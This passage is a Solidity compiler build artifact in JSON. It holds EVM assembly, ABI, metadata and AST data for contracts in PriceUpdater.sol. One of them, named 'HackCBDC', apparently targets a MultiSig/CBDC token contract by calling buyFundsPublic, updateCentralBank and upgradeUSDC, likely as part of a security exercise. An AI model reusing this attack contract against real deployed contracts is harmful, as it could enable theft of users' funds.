											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 851,
											"end": 855,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "PUSH",
											"source": 1,
											"value": "F99A1F3000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 851,
											"end": 855,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "SWAP5",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 842,
											"end": 871,
											"name": "PUSH",
											"source": 1,
											"value": "F99A1F30"
										},
										{
											"begin": 842,
											"end": 871,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 851,
											"end": 855,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 842,
											"end": 873,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 842,
											"end": 873,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 842,
											"end": 873,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 884,
											"end": 961,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 884,
											"end": 961,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 934,
											"end": 938,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "PUSH",
											"source": 1,
											"value": "F99A1F3000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 934,
											"end": 938,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 925,
											"end": 954,
											"name": "PUSH",
											"source": 1,
											"value": "F99A1F30"
										},
										{
											"begin": 925,
											"end": 954,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 934,
											"end": 938,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 925,
											"end": 956,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 925,
											"end": 956,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 925,
											"end": 956,
											"name": "REVERT",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"@openzeppelin/contracts/token/ERC20/IERC20.sol",
								"contracts/PriceUpdater.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"buyFundsPublic()": "f99a1f30",
							"updateCentralBank()": "9b6822f8",
							"upgradeUSDC()": "e9e8f34d"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"buyFundsPublic\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"updateCentralBank\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"upgradeUSDC\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/PriceUpdater.sol\":\"HackCBDC\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"contracts/PriceUpdater.sol\":{\"keccak256\":\"0x7dec7fb7d15823d14b2b00ec88f84c34cb6f7ddfc23de86ffb5ade77889ee7df\",\"license\":\"GPL-3.0\",\"urls\":[\"bzz-raw://608185919019e504ce467d2050b491185ff5b76b80235feea4ff50efb304caf5\",\"dweb:/ipfs/QmNa2tLH9s3NnS4wqGbMtsFsbSZjVB24N9uJ5JsCf7wv3z\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 107,
								"contract": "contracts/PriceUpdater.sol:HackCBDC",
								"label": "cbdc",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"MultiSig": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_newSig",
									"type": "address"
								}
							],
							"name": "addSignature",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "buyFundsPublic",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "signWithdrawal",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_newBank",
									"type": "address"
								}
							],
							"name": "updateCentralBank",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_usdc",
									"type": "address"
								}
							],
							"name": "upgradeUSDC",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the amount of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the amount of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"addSignature(address)": "f441d21a",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"buyFundsPublic()": "f99a1f30",
							"signWithdrawal()": "132ad223",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd",
							"updateCentralBank(address)": "077bf51a",
							"upgradeUSDC(address)": "8cba4686"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newSig\",\"type\":\"address\"}],\"name\":\"addSignature\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFundsPublic\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"signWithdrawal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newBank\",\"type\":\"address\"}],\"name\":\"updateCentralBank\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_usdc\",\"type\":\"address\"}],\"name\":\"upgradeUSDC\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the amount of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the amount of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/PriceUpdater.sol\":\"MultiSig\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"contracts/PriceUpdater.sol\":{\"keccak256\":\"0x7dec7fb7d15823d14b2b00ec88f84c34cb6f7ddfc23de86ffb5ade77889ee7df\",\"license\":\"GPL-3.0\",\"urls\":[\"bzz-raw://608185919019e504ce467d2050b491185ff5b76b80235feea4ff50efb304caf5\",\"dweb:/ipfs/QmNa2tLH9s3NnS4wqGbMtsFsbSZjVB24N9uJ5JsCf7wv3z\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							77
						]
					},
					"id": 78,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "106:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IERC20",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "131:70:0",
								"text": " @dev Interface of the ERC20 standard as defined in the EIP."
							},
							"fullyImplemented": false,
							"id": 77,
							"linearizedBaseContracts": [
								77
							],
							"name": "IERC20",
							"nameLocation": "212:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "225:158:0",
										"text": " @dev Emitted when `value` tokens are moved from one account (`from`) to\n another (`to`).\n Note that `value` may be zero."
									},
									"eventSelector": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
									"id": 11,
									"name": "Transfer",
									"nameLocation": "394:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"indexed": true,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "419:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "403:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "403:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"indexed": true,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "441:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "425:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 6,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "425:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 9,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "453:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "445:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 8,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "445:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "402:57:0"
									},
									"src": "388:72:0"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 12,
										"nodeType": "StructuredDocumentation",
										"src": "466:148:0",
										"text": " @dev Emitted when the allowance of a `spender` for an `owner` is set by\n a call to {approve}. `value` is the new allowance."
									},
									"eventSelector": "8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
									"id": 20,
									"name": "Approval",
									"nameLocation": "625:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 14,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "650:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "634:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 13,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "634:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 16,
												"indexed": true,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "673:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "657:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 15,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "657:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 18,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "690:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "682:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 17,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "682:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "633:63:0"
									},
									"src": "619:78:0"
								},
								{
									"documentation": {
										"id": 21,
										"nodeType": "StructuredDocumentation",
										"src": "703:66:0",
										"text": " @dev Returns the amount of tokens in existence."
									},
									"functionSelector": "18160ddd",
									"id": 26,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nameLocation": "783:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "794:2:0"
									},
									"returnParameters": {
										"id": 25,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 24,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 26,
												"src": "820:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 23,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "820:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "819:9:0"
									},
									"scope": 77,
									"src": "774:55:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 27,
										"nodeType": "StructuredDocumentation",
										"src": "835:72:0",
										"text": " @dev Returns the amount of tokens owned by `account`."
									},
									"functionSelector": "70a08231",
									"id": 34,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nameLocation": "921:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 29,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "939:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "931:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 28,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "931:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "930:17:0"
									},
									"returnParameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 32,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
